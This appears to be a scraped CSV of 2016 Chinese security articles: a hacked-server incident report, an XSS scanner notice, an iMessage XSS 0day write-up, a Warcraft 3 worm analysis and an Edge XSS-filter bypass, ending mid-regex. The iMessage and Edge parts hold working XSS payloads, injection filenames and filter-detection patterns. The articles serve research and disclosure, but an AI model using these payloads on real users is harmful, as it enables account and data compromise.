"5ccbfac64f2f0a0a7a69c0bb","这一切还要从我收到的通知邮件：“Your server is sending spam”说起。首先要说的是，这台服务器是用来运行之前项目的静态网站，并不保存关键信息。由于不经常使","blackhold","这一切还要从我收到的通知邮件：“Your server is sending spam”说起。首先要说的是，这台服务器是用来运行之前项目的静态网站，并不保存关键信息。由于不经常使用，即使有Joomla和WordPress这样的高危程序，我都懒得忘记定期更新了。这可能就是导致被入侵的原因。1 通知邮件经过一夜的狂欢聚会后，我收到了服务器提供商OVH的通知邮件，邮件告知我的服务器成为了垃圾邮件发送源，其中还提及了一些细节：KenaGard是我之前创建的公司，现在已经不运行了，但是基于Joomla的公司网站www.kenagard.com仍然可以访问，并且使用的还是老版本的Joomla！我想问题有可能就出在Joomla上。Joomla的问题我立即进入网站目录查看可疑情况：最后两行是我之前执行过的合法操作，之后的操作就不得而知了，我想我的服务器已经变成瑞士奶酪了！入侵行为可能发生于2016-02-25、2016-02-29、2016-08-21三个时间点的操作。探究入侵操作2016-08-21的入侵操作中包含了文件jtemplate.php：该PHP文件是经过加密的代码，经过UnPHP解密之后可以看到部分信息：实际上，上述代码的功能如下：Base64和str_rot13为加密混淆函数，起到逃避安全软件和迷惑分析的作用。assert函数在这里，它被当成一个提权命令来使用，用来上传攻击载荷和其它黑客工具。PHP一句话木马！探究入侵深度在该网站设置中，只有www-data用户组才能执行php代码文件。而且，我发现很难通过apt方式来安装软件，所以想要更新系统也变成了一件几乎不可能的事了！现在，好像整个服务器已经不属于我的了！另外，我很难发现攻击者的提权操作痕迹，所以，只能通过日期和ps aux命令来查看系统异常。另外，我还发现了第四条关于WordPress的异常操作，虽然不能确定攻击者意图，但是看上去仍属于入侵操作。而且网站系统内每个目录文件夹内都有类似文件：logo_img.php, images/mbaig/emkwg.php, dir32.php, .htaccess。其中某个文件不仅用来执行远程代码，还向远程地址4lmbkpqrklqv.net发送信息，经查询，域名4lmbkpqrklqv.net归属一位乌克兰人Nikolay Pohomov所有。2 解决方法啊，在那分钟，我真想砸了这台机器！升级Joomla，升级WordPress， 格式化，重装….，天哪，饶了我吧，我哪有这么多时间。所以我决定采取一些保守的安全解决对策。停止向外发送垃圾邮件ps aux命令显示了很多垃圾邮件发送进程，使用以下命令来终止：ps aux|grep -v grep|grep sendmail|awk {print $2} | xargs kill -9清空邮件发送队列rm /var/spool/mqueue/*禁止CMS系统POST数据提交因为该系统网站已经停止更新了，所以禁止POST方式，能简单阻塞攻击者提交的数据。在nginx中简单进行以下配置：最后，别忘记服务重启命令service nginx reload。清除攻击者后门禁止POST方式不能完全堵塞攻击者通道，你必须清除攻击者在系统上留下的相关黑客工具和文件。3 其它信息通过日志分析，发现进行jtemplate.php操作的IP为乌克兰IP185.93.187.66，但是，貌似这个IP没有提交过POST数据。另外，我还发现一个可能属于Amazon的可疑IP的操作：因此，我决定把目录/administrator (Joomla!) 和/wp-admin (WordPress)用以下方式做限制访问。最后，别忘记重启命令service nginx reload4 总结由于我不是专业的安全人士，对于这些经常不更新的老旧系统，我能想到唯一防止黑客攻击的方法可能就是使用Docker了。以下是网友对我这篇博客的一些评论：你的服务器已经被入侵了，所以请别用家庭电脑远程连接来处理这类安全事件在重装系统过程中使用默认配置可以使用恶意程序检测工具Linux Malware Detects和脚本ctimer.php在防火墙上开启仅系统所需的端口","2016-09-06 11:46:13","系统安全","一次对个人服务器入侵事件的调查","http://nsoad.com/Article/system/20160906/353.html"
"5ccbfac64f2f0a0a7a69c0bc","项目主页https://github.com/lewangbtcc/anti-XSS简介anti-XSS采用Python编写，除了必要的系统库和报告生成库，没有引入任何第三方库。通过迭代和二次开发，anti-XSS不仅可","Kender","项目主页https://github.com/lewangbtcc/anti-XSS简介anti-XSS采用Python编写，除了必要的系统库和报告生成库，没有引入任何第三方库。通过迭代和二次开发，anti-XSS不仅可以在远端对目标站点进行XSS脚本的探测扫描，同时还可以部署在服务器上监控Web环境。目前发布的版本为anti-XSS Pre-Release v0.1-alpha，相信经过一段时间的测试和开发，Release V1.0能够很快发布。RequirementsPython 2.7.xReportlab安装你可以点击这里下载zip 格式的安装包当然最好是通过Git下载并按要求来安装anti-XSS$ git clone https://git@github.com:lewangbtcc/anti-XSS.git anti-XSS$ cd anti-XSS$ pip install -r requirements.txtanti-XSS可以运行在安装有Python2.7的任何平台上使用基本的选项和使用帮助：python anti-XSS.py -h或者python anti-XSS.py --help具体的使用请参考用户手册：https://github.com/lewangbtcc/anti-XSS/wikiLinks作者主页: http://laiw3n.comDownload: .tar.gz or .zip","2016-11-03 05:16:20","安全工具","anti-XSS：开源XSS脚本检测工具","http://nsoad.com/Security-tools/20161103/tools-683.html"
"5ccbfac64f2f0a0a7a69c0bd","注：文章里“0day”在报告给官方后分配漏洞编号：CVE-2016-1843一、背景在前几天老外发布了一个在3月更新里修复的iMessage xss漏洞（CVE-2016-1764）细节 ：http","SuperHei","注：文章里“0day”在报告给官方后分配漏洞编号：CVE-2016-1843一、背景在前几天老外发布了一个在3月更新里修复的iMessage xss漏洞（CVE-2016-1764）细节 ：https://www.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data/https://github.com/BishopFox/cve-2016-1764他们公布这些细节里其实没有给出详细触发点的分析，我分析后也就是根据这些信息发现了一个新的0day。二、CVE-2016-1764 漏洞分析CVE-2016-1764 里的最简单的触发payload： javascript://a/research?%0d%0aprompt(1) 可以看出这个是很明显javascript协议里的一个小技巧 %0d%0 没处理后导致的 xss ，这个tips在找xss漏洞里是比较常见的。这个值得提一下的是 为啥要用prompt(1) 而我们常用的是alert(1) ，我实际测试了下发现alert确实没办法弹出来，另外在很多的网站其实把alert直接和谐过滤了，所以这里给提醒大家的是在测试xss的时候，把 prompt 替换 alert 是有必要的～遇到这样的客户端的xss如果要分析，第一步应该看看location.href的信息。这个主要是看是哪个域下，这个漏洞是在applewebdata://协议下，这个原漏洞分析里有给出。然后要看具体的触发点，一般在浏览器下我们可以通过看html源代码来分析，但是在客户端下一般看不到，所以这里用到一个小技巧：javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)  这里是看html里的head代码&lt;style&gt;@media screen and (-webkit-device-pixel-ratio:2) {}&lt;/style&gt;&lt;link rel=""stylesheet"" type=""text/css"" href=""file:///System/Library/PrivateFrameworks/SocialUI.framework/Resources/balloons-modern.css""&gt;  继续看下body的代码：javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)&lt;chatitem id=""v:iMessage/xxx@xxx.com/E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx"" contiguous=""no"" role=""heading"" aria-level=""1"" item-type=""header""&gt;&lt;header guid=""v:iMessage/xxx@xxx.com/E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx""&gt;&lt;headermessage text-direction=""ltr""&gt;与“xxx@xxx.com”进行 iMessage 通信&lt;/headermessage&gt;&lt;/header&gt;&lt;/chatitem&gt;&lt;chatitem id=""d:E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx"" contiguous=""no"" role=""heading"" aria-level=""2"" item-type=""timestamp""&gt;&lt;timestamp guid=""d:E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx"" id=""d:E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx""&gt;&lt;date date=""481908183.907740""&gt;今天 23:23&lt;/date&gt;&lt;/timestamp&gt;&lt;/chatitem&gt;&lt;chatitem id=""p:0/E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx"" contiguous=""no"" chatitem-message=""yes"" role=""presentation"" display-type=""balloon"" item-type=""text"" group-last-message-ignore-timestamps=""yes"" group-first-message-ignore-timestamps=""yes""&gt;&lt;message guid=""p:0/E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx"" service=""imessage"" typing-indicator=""no"" sent=""no"" from-me=""yes"" from-system=""no"" from=""B392EC10-CA04-41D3-A967-5BB95E301475"" emote=""no"" played=""no"" auto-reply=""no"" group-last-message=""yes"" group-first-message=""yes""&gt;&lt;buddyicon role=""img"" aria-label=""黑哥""&gt;&lt;div&gt;&lt;/div&gt;&lt;/buddyicon&gt;&lt;messagetext&gt;&lt;messagebody title=""今天 23:23:03"" aria-label=""javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)""&gt;&lt;messagetextcontainer text-direction=""ltr""&gt;&lt;span style=""""&gt;&lt;a href="" "" title=""javascript://a/research?  prompt(1,document.body.innerHTML)""&gt;javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)&lt;/a &gt;&lt;/span&gt;&lt;/messagetextcontainer&gt;&lt;/messagebody&gt;&lt;message-overlay&gt;&lt;/message-overlay&gt;&lt;/messagetext&gt;&lt;date class=""compact""&gt;&lt;/date&gt;&lt;/message&gt;&lt;spacer&gt;&lt;/spacer&gt;&lt;/chatitem&gt;&lt;chatitem id=""p:0/64989837-6626-44CE-A689-5460313DC817"" contiguous=""no"" chatitem-message=""yes"" role=""presentation"" display-type=""balloon"" item-type=""text"" group-first-message-ignore-timestamps=""yes"" group-last-message-ignore-timestamps=""yes""&gt;&lt;message guid=""p:0/64989837-6626-44CE-A689-5460313DC817"" typing-indicator=""no"" sent=""no"" from-me=""no"" from-system=""no"" from=""D8FAE154-6C88-4FB6-9D2D-0C234BEA8E99"" emote=""no"" played=""no"" auto-reply=""no"" group-first-message=""yes"" group-last-message=""yes""&gt;&lt;buddyicon role=""img"" aria-label=""黑哥""&gt;&lt;div&gt;&lt;/div&gt;&lt;/buddyicon&gt;&lt;messagetext&gt;&lt;messagebody title=""今天 23:23:03"" aria-label=""javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)""&gt;&lt;messagetextcontainer text-direction=""ltr""&gt;&lt;span style=""""&gt;&lt;a href=""javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)"" title=""javascript://a/research?  prompt(1,document.body.innerHTML)""&gt;javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)&lt;/a &gt;&lt;/span&gt;&lt;/messagetextcontainer&gt;&lt;/messagebody&gt;&lt;message-overlay&gt;&lt;/message-overlay&gt;&lt;/messagetext&gt;&lt;date class=""compact""&gt;&lt;/date&gt;&lt;/message&gt;&lt;spacer&gt;&lt;/spacer&gt;&lt;/chatitem&gt;&lt;chatitem id=""p:0/AE1ABCF1-2397-4F20-A71F-D71FFE8042F5"" contiguous=""no"" chatitem-message=""yes"" role=""presentation"" display-type=""balloon"" item-type=""text"" group-last-message-ignore-timestamps=""yes"" group-first-message-ignore-timestamps=""yes""&gt;&lt;message guid=""p:0/AE1ABCF1-2397-4F20-A71F-D71FFE8042F5"" service=""imessage"" typing-indicator=""no"" sent=""no"" from-me=""yes"" from-system=""no"" from=""B392EC10-CA04-41D3-A967-5BB95E301475"" emote=""no"" played=""no"" auto-reply=""no"" group-last-message=""yes"" group-first-message=""yes""&gt;&lt;buddyicon role=""img"" aria-label=""黑哥""&gt;&lt;div&gt;&lt;/div&gt;&lt;/buddyicon&gt;&lt;messagetext&gt;&lt;messagebody title=""今天 23:24:51"" aria-label=""javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)""&gt;&lt;messagetextcontainer text-direction=""ltr""&gt;&lt;span style=""""&gt;&lt;a href=""javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)"" title=""javascript://a/research?  prompt(1,document.head.innerHTML)""&gt;javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)&lt;/a &gt;&lt;/span&gt;&lt;/messagetextcontainer&gt;&lt;/messagebody&gt;&lt;message-overlay&gt;&lt;/message-overlay&gt;&lt;/messagetext&gt;&lt;date class=""compact""&gt;&lt;/date&gt;&lt;/message&gt;&lt;spacer&gt;&lt;/spacer&gt;&lt;/chatitem&gt;&lt;chatitem id=""s:AE1ABCF1-2397-4F20-A71F-D71FFE8042F5"" contiguous=""no"" role=""heading"" aria-level=""1"" item-type=""status"" receipt-fade=""in""&gt;&lt;receipt from-me=""YES"" id=""receipt-delivered-s:ae1abcf1-2397-4f20-a71f-d71ffe8042f5""&gt;&lt;div class=""receipt-container""&gt;&lt;div class=""receipt-item""&gt;已送达&lt;/div&gt;&lt;/div&gt;&lt;/receipt&gt;&lt;/chatitem&gt;&lt;chatitem id=""p:0/43545678-5DB7-4B35-8B81-xxxxxxxxxxxx"" contiguous=""no"" chatitem-message=""yes"" role=""presentation"" display-type=""balloon"" item-type=""text"" group-first-message-ignore-timestamps=""yes"" group-last-message-ignore-timestamps=""yes""&gt;&lt;message guid=""p:0/43545678-5DB7-4B35-8B81-xxxxxxxxxxxx"" typing-indicator=""no"" sent=""no"" from-me=""no"" from-system=""no"" from=""D8FAE154-6C88-4FB6-9D2D-0C234BEA8E99"" emote=""no"" played=""no"" auto-reply=""no"" group-first-message=""yes"" group-last-message=""yes""&gt;&lt;buddyicon role=""img"" aria-label=""黑哥""&gt;&lt;div&gt;&lt;/div&gt;&lt;/buddyicon&gt;&lt;messagetext&gt;&lt;messagebody title=""今天 23:24:51"" aria-label=""javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)""&gt;&lt;messagetextcontainer text-direction=""ltr""&gt;&lt;span style=""""&gt;&lt;a href=""javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)"" title=""javascript://a/research?  prompt(1,document.head.innerHTML)""&gt;javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)&lt;/a &gt;&lt;/span&gt;&lt;/messagetextcontainer&gt;&lt;/messagebody&gt;&lt;message-overlay&gt;&lt;/message-overlay&gt;&lt;/messagetext&gt;&lt;date class=""compact""&gt;&lt;/date&gt;&lt;/message&gt;&lt;spacer&gt;&lt;/spacer&gt;&lt;/chatitem&gt;  那么关键的触发点:&lt;a href=""javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)"" title=""javascript://a/research?  prompt(1,document.head.innerHTML)""&gt;javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)&lt;/a &gt;  就是这个了。 javascript直接进入a标签里的href，导致点击执行。新版本的修复方案是直接不解析javascript:// 。三、从老漏洞(CVE-2016-1764)到0dayXSS的漏洞本质是你注入的代码最终被解析执行了，既然我们看到了document.head.innerHTML的情况，那么有没有其他注入代码的机会呢？首先我测试的肯定是还是那个点，尝试用""及&lt;&gt;去闭合，可惜都被过滤了，这个点不行我们可以看看其他存在输入的点，于是我尝试发个附件看看解析情况，部分代码如下：&lt;chatitem id=""p:0/FE98E898-0385-41E6-933F-8E87DB10AA7E"" contiguous=""no"" chatitem-message=""yes"" role=""presentation"" display-type=""balloon"" item-type=""attachment"" group-first-message-ignore-timestamps=""yes"" group-last-message-ignore-timestamps=""yes""&gt;&lt;message guid=""p:0/FE98E898-0385-41E6-933F-8E87DB10AA7E"" typing-indicator=""no"" sent=""no"" from-me=""no"" from-system=""no"" from=""D8FAE154-6C88-4FB6-9D2D-0C234BEA8E99"" emote=""no"" played=""no"" auto-reply=""no"" group-first-message=""yes"" group-last-message=""yes""&gt;&lt;buddyicon role=""img"" aria-label=""黑哥""&gt;&lt;div&gt;&lt;/div&gt;&lt;/buddyicon&gt;&lt;messagetext&gt;&lt;messagebody title=""今天 23:34:41"" file-transfer-element=""yes"" aria-label=""文件传输: tttt.html""&gt;&lt;messagetextcontainer text-direction=""ltr""&gt;&lt;transfer class=""transfer"" id=""45B8E6BD-9826-47E2-B910-D584CE461E5F"" guid=""45B8E6BD-9826-47E2-B910-D584CE461E5F""&gt;&lt;transfer-atom draggable=""true"" aria-label=""tttt.html"" id=""45B8E6BD-9826-47E2-B910-D584CE461E5F"" guid=""45B8E6BD-9826-47E2-B910-D584CE461E5F""&gt;&lt; img class=""transfer-icon"" extension=""html"" aria-label=""文件扩展名: html"" style=""content: -webkit-image-set(url(transcript-resource://iconpreview/html/16) 1x, url(transcript-resource://iconpreview/html-2x/16) 2x);""&gt;&lt;span class=""transfer-text"" color-important=""no""&gt;tttt&lt;/span&gt;&lt;/transfer-atom&gt;&lt;div class=""transfer-button-container""&gt;&lt; img class=""transfer-button-reveal"" aria-label=""显示"" id=""filetransfer-button-45B8E6BD-9826-47E2-B910-D584CE461E5F"" role=""button""&gt;&lt;/div&gt;&lt;/transfer&gt;&lt;/messagetextcontainer&gt;&lt;/messagebody&gt;&lt;message-overlay&gt;&lt;/message-overlay&gt;&lt;/messagetext&gt;&lt;date class=""compact""&gt;&lt;/date&gt;&lt;/message&gt;&lt;spacer&gt;&lt;/spacer&gt;&lt;/chatitem&gt;  发了个tttt.html的附件，这个附件的文件名出现在代码里，或许有控制的机会。多长测试后发现过滤也比较严格，不过最终还是发现一个潜在的点，也就是文件名的扩展名部分：&lt;chatitem id=""p:0/D4591950-20AD-44F8-80A1-E65911DCBA22"" contiguous=""no"" chatitem-message=""yes"" role=""presentation"" display-type=""balloon"" item-type=""attachment"" group-first-message-ignore-timestamps=""yes"" group-last-message-ignore-timestamps=""yes""&gt;&lt;message guid=""p:0/D4591950-20AD-44F8-80A1-E65911DCBA22"" typing-indicator=""no"" sent=""no"" from-me=""no"" from-system=""no"" from=""93D2D530-0E94-4CEB-A41E-2F21DE32715D"" emote=""no"" played=""no"" auto-reply=""no"" group-first-message=""yes"" group-last-message=""yes""&gt;&lt;buddyicon role=""img"" aria-label=""黑哥""&gt;&lt;div&gt;&lt;/div&gt;&lt;/buddyicon&gt;&lt;messagetext&gt;&lt;messagebody title=""今天 16:46:10"" file-transfer-element=""yes"" aria-label=""文件传输: testzzzzzzz&amp;quot;'&amp;gt;&amp;lt;img src=1&amp;gt;.htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d""&gt;&lt;messagetextcontainer text-direction=""ltr""&gt;&lt;transfer class=""transfer"" id=""A6BE6666-ADBF-4039-BF45-042D261EA458"" guid=""A6BE6666-ADBF-4039-BF45-042D261EA458""&gt;&lt;transfer-atom draggable=""true"" aria-label=""testzzzzzzz&amp;quot;'&amp;gt;&amp;lt;img src=1&amp;gt;.htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d"" id=""A6BE6666-ADBF-4039-BF45-042D261EA458"" guid=""A6BE6666-ADBF-4039-BF45-042D261EA458""&gt;&lt; img class=""transfer-icon"" extension=""htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d"" aria-label=""文件扩展名: htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d"" style=""content: -webkit-image-set(url(transcript-resource://iconpreview/htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d/16) 1x, url(transcript-resource://iconpreview/htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d-2x/16) 2x);""&gt;&lt;span class=""transfer-text"" color-important=""no""&gt;testzzzzzzz""'&amp;gt;&amp;lt;img src=1&amp;gt;&lt;/span&gt;&lt;/transfer-atom&gt;&lt;div class=""transfer-button-container""&gt;&lt; img class=""transfer-button-reveal"" aria-label=""显示"" id=""filetransfer-button-A6BE6666-ADBF-4039-BF45-042D261EA458"" role=""button""&gt;&lt;/div&gt;&lt;/transfer&gt;&lt;/messagetextcontainer&gt;&lt;/messagebody&gt;&lt;message-overlay&gt;&lt;/message-overlay&gt;&lt;/messagetext&gt;&lt;date class=""compact""&gt;&lt;/date&gt;&lt;/message&gt;&lt;spacer&gt;&lt;/spacer&gt;&lt;/chatitem&gt;  我们提交的附件的后缀进入了style ： style=""content: -webkit-image-set(url(transcript-resource://iconpreview/htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d/16) 1x, url(transcript-resource://iconpreview/htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d-2x/16) 2x);也就是可能导致css注入，或许我们还有机会，不过经过测试也是有过滤处理的，比如/ 直接被转为了:这个非常有意思 所谓“成也萧何，败也萧何”，如果你要注入css那么肯定给属性给值就得用: 但是:又不能出现在文件名里，然后我们要注入css里掉用远程css或者图片需要用/ 而/又被处理了变成了:不管怎么样我先注入个css测试下，于是提交了一附件名：zzzzzz.htm) 1x);color/red;aaa/((按推断/变为了: 如果注入成功应该是style=""content: -webkit-image-set(url(transcript-resource://iconpreview/htm::16) 1x);color:red;aaa:((  当我提交测试发送这个附件的时候，我的iMessage 崩溃了～～ 这里我想我发现了一个新的漏洞，于是我升级OSX到最新的系统重新测试结果：一个全新的0day诞生！四、后记当然这里还有很多地方可以测试，也有一些思路也可以去测试下，比如那个名字那里这个应该是可控制的，比如附件是保存在本地的有没有可能存在目录专挑导致写到任意目录的地方。有需求的可以继续测试下，说不定下个0day就是你的 ：）最后我想说的是在分析别人发现的漏洞的时候一定要找到漏洞的关键，然后总结提炼出“模型”，然后去尝试新的攻击思路或者界面！参考链接https://www.seebug.org/vuldb/ssvid-92471","2016-10-13 01:00:10","Web安全","从老漏洞到新漏洞 --- iMessage 0day(CVE-2016-1843) 挖掘实录","http://nsoad.com/Article/web/20161013/533.html"
"5ccbfac64f2f0a0a7a69c0be","近日，腾讯电脑管家发现一个可疑脚本被创建为启动项，通过分析和搜索相关信息，发现大量网友反馈，重现了中毒场景。","blackhold","近日，腾讯电脑管家发现一个可疑脚本被创建为启动项，通过分析和搜索相关信息，发现大量网友反馈，重现了中毒场景。该蠕虫传播原理如下：1，    蠕虫作者上传带蠕虫的魔兽地图，并以该地图创建房间吸引其他玩家进入房间游戏；2，    玩家进入房间后，就会自动下载该地图，并进行游戏后，触发魔兽地图里恶意脚本。脚本利用漏洞成功在启动目录创建loil.bat脚本文件；3，    当玩家重启电脑后，Loil.bat获得执行，通过脚本下载loli.exe执行；4，    Loli.exe把玩家魔兽目录下的正常地图文件全部感染植入蠕虫。玩家在不知情的情况下，会使用这些被感染的地图创建游戏，感染更多玩家；5，    接着loli.exe释放魔兽插件War3_UnHack.asi。每当魔兽启动时，会自动加载该插件；6，    玩家每次启动魔兽后War3_UnHack.asi获得执行权，又重新下载loil.exe蠕虫，使得该病毒难以删除。详细的漏洞原理，可参照: http://tieba.baidu.com/p/965868161?pn=1“萝莉”蠕虫详细分析一、整个蠕虫的大致运行流程如下图：1、    魔兽争霸3游戏地图文件由多个部分组成，其中地图里的逻辑控制代码部份由war3map.j控制。该脚本文件由魔兽争霸3程序语言JASS编写而成，是地图文件里最重要部份之一。2、地图中的脚本war3map.j文件被植入恶意脚本，该恶意脚本利用JASS写文件漏洞，在游戏开始后，创建loli.bat文件到系统启动目录里。当玩家第二天重新启动电脑后，该bat文件就获得执行机会。3，loli.bat的功能是将脚本代码写入到 loli.vbs 文件中，loli.vbs是经过加密处理，解密后的loli.vbs，其功能是下载一个loli.bat到c:\loli.bat下载下来的c:\loli.bat经过混淆处理，包括在文件头部添加unicode标识使得用文本编辑器打开后呈现乱码，其功能是删除c:\loli.vbs，并创建c:\loli.vbec:\loli.vbe经过编码，解码后代码如下图所示解密后的c:\loli.vbe脚本内容如下，其功能是下载loli.exe运行二、loli.exe主要负责下载安装游戏的蠕虫插件，感染玩家正常地图文件植入恶意脚本1、下载插件（War3_UnHack.asi）。该插件会随着魔兽争霸的启动而加载运行。主要用作下载木马，发布垃圾消息等。2、删除loli.bat文件3、修改魔兽争霸w3x格式的地图文件里的脚本控制模块war3map.j植入恶意代表码，导致该蠕虫可能在玩家之间大量传播。                                    （玩家正常地图文件被植入恶意脚本）三、War3_UnHack.asi行为通过把该文件放到魔兽争霸redist\miles目录下即可完成安装。War3.exe每次启动就会加载该蠕虫插件。该蠕虫会下载恶意程序执行。在玩家游戏时，会调用jass函数自动发布广告。腾讯电脑管家首发受感染地图修复工具，点击这里下载。","2016-11-21 14:58:14","网络安全","利用《魔兽争霸3》漏洞传播的“萝莉”蠕虫分析","http://nsoad.com/Article/Network-security/20161121/824.html"
"5ccbfac64f2f0a0a7a69c0bf","作者曾经在2015年9月向微软提交了这个bug，但是微软至今也没有修复这个问题。考虑到离提交报告已经过去了很长时间，于是作者决定在他的博客中公开这个问题。","blackhold","作者曾经在2015年9月向微软提交了这个bug，但是微软至今也没有修复这个问题。考虑到离提交报告已经过去了很长时间，于是作者决定在他的博客中公开这个问题。过去 IE 有一个缺陷，你可以使用位置对象作为一个函数，并结合  toString/valueOf 按照对象的字面意义来执行代码。基本上你可以使用对象的字面意义作为一个伪数组然后调用 join  函数构造成字符串，随后将依次其传递给 valueOf 和位置对象。下面是代码：-{toString:[].join,length:1,0:'javascript:alert(123)',valueOf:location}这在最新版的 Edge 上同样有用，但是浏览器会检测到 XSS 攻击。XSS  过滤器的正则表达式检测到一个字符串后面跟随若干包含 “{” 或 “,”的字符以及 toString/valueOf 和冒号。valueOf  中的字符 “a” 和 toString 中的字符 “o” 会被替换为 “#”。下面是一个简化版的正则表达式：[""'`].*?[{,].*(valueOf|toString).*?:}下面是2015年10月份的Edge XSS 过滤正则表达式。{ {[\""\'`][ ]*(([^a-z0-9~_:\'\""` ])|(in)).+?{[\(`]}.*?{[\)`]}}{[\""\'`].*?[{,].*(((v|(\\u0076)|(\\u[{]0*76[}])|(\\166)|(\\x76))[^a-z0-9]*({a}|(\\u00{6}1)|(\\u[{]0*{6}1[}])|(\\1{4}1)|(\\x{6}1))[^a-z0-9]*(l|(\\u006C)|(\\u[{]0*6C[}])|(\\154)|(\\x6C))[^a-z0-9]*(u|(\\u0075)|(\\u[{]0*75[}])|(\\165)|(\\x75))[^a-z0-9]*(e|(\\u0065)|(\\u[{]0*65[}])|(\\145)|(\\x65))[^a-z0-9]*(O|(\\u004F)|(\\u[{]0*4F[}])|(\\117)|(\\x4F))[^a-z0-9]*(f|(\\u0066)|(\\u[{]0*66[}])|(\\146)|(\\x66)))|((t|(\\u0074)|(\\u[{]0*74[}])|(\\164)|(\\x74))[^a-z0-9]*({o}|(\\u00{6}F)|(\\u[{]0*{6}F[}])|(\\1{5}7)|(\\x{6}F))[^a-z0-9]*(S|(\\u0053)|(\\u[{]0*53[}])|(\\123)|(\\x53))[^a-z0-9]*(t|(\\u0074)|(\\u[{]0*74[}])|(\\164)|(\\x74))[^a-z0-9]*(r|(\\u0072)|(\\u[{]0*72[}])|(\\162)|(\\x72))[^a-z0-9]*(i|(\\u0069)|(\\u[{]0*69[}])|(\\151)|(\\x69))[^a-z0-9]*(n|(\\u006E)|(\\u[{]0*6E[}])|(\\156)|(\\x6E))[^a-z0-9]*(g|(\\u0067)|(\\u[{]0*67[}])|(\\147)|(\\x67)))).*?:}{}{ {]}{ { { {[\""\'`][ ]*(([^a-z0-9~_:\'\""` ])|(in)).+?{[\[]}.*?{[\]]}.*?=}{[\""\'`][ ]*(([^a-z0-9~_:\'\""` ])|(in)).+?{[.]}.+?=}{[\""\'`].*?{[\)`]}[ ]*(([^a-z0-9~_:\'\""` ])|(in)).+?{[\(`]}}{}{[\""\'`][ ]*(([^a-z0-9~_:\'\""`  ])|(in)).*?(((l|(\\u006[Cc])|(\\u[{]0*6[Cc][}]))(o|(\\u006[Ff])|(\\u[{]0*6[Ff][}]))({c}|(\\u00{6}3)|(\\u[{]0*{6}3[}]))(a|(\\u0061)|(\\u[{]0*61[}]))(t|(\\u0074)|(\\u[{]0*74[}]))(i|(\\u0069)|(\\u[{]0*69[}]))(o|(\\u006[Ff])|(\\u[{]0*6[Ff][}]))(n|(\\u006[Ee])|(\\u[{]0*6[Ee][}])))|((n|(\\u006[Ee])|(\\u[{]0*6[Ee][}]))(a|(\\u0061)|(\\u[{]0*61[}]))({m}|(\\u00{6}[Dd])|(\\u[{]0*{6}[Dd][}]))(e|(\\u0065)|(\\u[{]0*65[}])))|((o|(\\u006[Ff])|(\\u[{]0*6[Ff][}]))(n|(\\u006[Ee])|(\\u[{]0*6[Ee][}]))({e}|(\\u00{6}5)|(\\u[{]0*{6}5[}]))(r|(\\u0072)|(\\u[{]0*72[}]))(r|(\\u0072)|(\\u[{]0*72[}]))(o|(\\u006[Ff])|(\\u[{]0*6[Ff][}]))(r|(\\u0072)|(\\u[{]0*72[}])))|((v|(\\u0076)|(\\u[{]0*76[}]))(a|(\\u0061)|(\\u[{]0*61[}]))({l}|(\\u00{6}[Cc])|(\\u[{]0*{6}[Cc][}]))(u|(\\u0075)|(\\u[{]0*75[}]))(e|(\\u0065)|(\\u[{]0*65[}]))(O|(\\u004[Ff])|(\\u[{]0*6[Ff][}]))(f|(\\u0066)|(\\u[{]0*66[}])))).*?=}{]}{[ /+\t\""\'`]data{s}rc[ +\t]*?=.}{ { {.*?((@[i\\])|(([:=]|(&amp;#x?0*((58)|(3A)|(61)|(3D));?)).*?([(\\]|(&amp;#x?0*((40)|(28)|(92)|(5C));?))))}{[ /+\t\""\'`]st{y}le[ /+\t]*?=.*?([:=]|(&amp;#x?0*((58)|(3A)|(61)|(3D));?)).*?([(\\]|(&amp;#x?0*((40)|(28)|(92)|(5C));?))}{ {[ /+\t\""\'`]{o}n\c\c\c+?[ +\t]*?=.}{&lt;.*[:]vmlf{r}ame.*?[ /+\t]*?src[ /+\t]*=}{&lt;[i]?f{r}ame.*?[ /+\t]*?src[ /+\t]*=}{]}{ {&lt;[?]?im{p}ort[ /+\t].*?implementation[ /+\t]*=}{  